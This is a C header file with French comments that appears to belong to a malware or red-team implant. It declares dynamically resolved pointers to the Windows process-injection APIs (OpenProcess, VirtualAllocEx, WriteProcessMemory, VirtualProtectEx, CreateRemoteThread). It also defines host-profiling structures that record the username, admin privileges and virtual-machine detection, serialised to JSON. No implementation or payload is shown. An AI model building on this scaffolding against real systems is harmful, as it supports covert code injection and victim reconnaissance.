

#include <windows.h>
#include <stdint.h>

typedef HANDLE(WINAPI* pOpenProcess)(
    DWORD dwDesiredAccess,
    BOOL  bInheritHandle,
    DWORD dwProcessId
    );

typedef LPVOID(WINAPI* pVirtualAllocEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flAllocationType,
    DWORD  flProtect
    );

typedef BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef BOOL(WINAPI* pVirtualProtectEx)(
    HANDLE hProcess,
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect
    );

typedef HANDLE(WINAPI* pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
    );

typedef enum {
    ARCH_UNKNOWN = 0,
    ARCH_X86,
    ARCH_X86_64,
    ARCH_ARM,
    ARCH_ARM64,
    ARCH_MIPS,
    ARCH_PPC
} Architecture;

typedef enum {
    OS_UNKNOWN = 0,
    OS_WINDOWS,
    OS_LINUX,
    OS_MACOS,
    OS_BSD
} OperatingSystem;


// ============================================================================
// DISK INFORMATION STRUCTURE
// ============================================================================
#define MAX_DISK_NAME 256
#define MAX_DISKS 32

typedef struct {
    char name[MAX_DISK_NAME];           // Nom du disque (ex: "C:", "/dev/sda1")
    char mount_point[MAX_DISK_NAME];    // Point de montage (ex: "/", "C:\")
    char filesystem[64];                 // Type de système de fichiers
    uint64_t total_space;                // Espace total en bytes
    uint64_t free_space;                 // Espace libre en bytes
    uint64_t available_space;            // Espace disponible pour l'utilisateur
} DiskInfo;

// ============================================================================
// NETWORK INTERFACE INFORMATION
// ============================================================================
#define MAX_INTERFACES 16
#define MAX_INTERFACE_NAME 64
#define MAX_IP_LENGTH 64

typedef struct {
    char name[MAX_INTERFACE_NAME];      // Nom de l'interface (ex: "eth0", "wlan0")
    char ip_address[MAX_IP_LENGTH];     // Adresse IP
    char mac_address[24];                // Adresse MAC
    int is_up;                           // Interface active (1) ou non (0)
} NetworkInterface;

// ============================================================================
// SYSTEM INFORMATION STRUCTURE
// ============================================================================
typedef struct {
    // Architecture et OS
    Architecture architecture;
    OperatingSystem os;
    char os_version[256];
    char hostname[256];

    // CPU
    int nb_processors;
    int nb_physical_cores;
    int nb_logical_cores;
    char cpu_model[256];
    uint64_t cpu_frequency_mhz;

    // Mémoire
    uint64_t total_ram_mb;
    uint64_t available_ram_mb;
    uint64_t used_ram_mb;
    int ram_usage_percent;

    // Disques
    int nb_disks;
    DiskInfo disks[MAX_DISKS];

    // Réseau
    int nb_interfaces;
    NetworkInterface interfaces[MAX_INTERFACES];

    // Informations supplémentaires
    uint64_t uptime_seconds;
    char username[256];
    int is_admin;                        // Privilèges admin/root
    int is_vm;                           // Détection de VM
} SystemInfo;

// ============================================================================
// FUNCTION PROTOTYPES
// ============================================================================

/**
 * Détecte l'architecture du système
 * @return Architecture détectée
 */
Architecture detect_architecture(void);

/**
 * Retourne le nom de l'architecture sous forme de string
 * @param arch Architecture à convertir
 * @return Nom de l'architecture
 */
const char* architecture_to_string(Architecture arch);

/**
 * Détecte le système d'exploitation
 * @return OS détecté
 */
OperatingSystem detect_os(void);

/**
 * Retourne le nom de l'OS sous forme de string
 * @param os OS à convertir
 * @return Nom de l'OS
 */
const char* os_to_string(OperatingSystem os);

/**
 * Collecte toutes les informations système
 * @param info Pointeur vers la structure à remplir
 * @return 0 en cas de succès, -1 en cas d'erreur
 */
int collect_system_info(SystemInfo* info);

/**
 * Affiche les informations système
 * @param info Structure contenant les informations
 */
void print_system_info(const SystemInfo* info);

/**
 * Sérialise les informations système en JSON
 * @param info Structure contenant les informations
 * @param buffer Buffer pour stocker le JSON
 * @param buffer_size Taille du buffer
 * @return Nombre de caractères écrits
 */
int system_info_to_json(const SystemInfo* info, char* buffer, size_t buffer_size);

pOpenProcess openProcess;
pVirtualProtectEx virtualProtectEx;
pWriteProcessMemory writeProcessMemory;
pVirtualAllocEx virtualAllocEx;
pCreateRemoteThread createRemoteThread;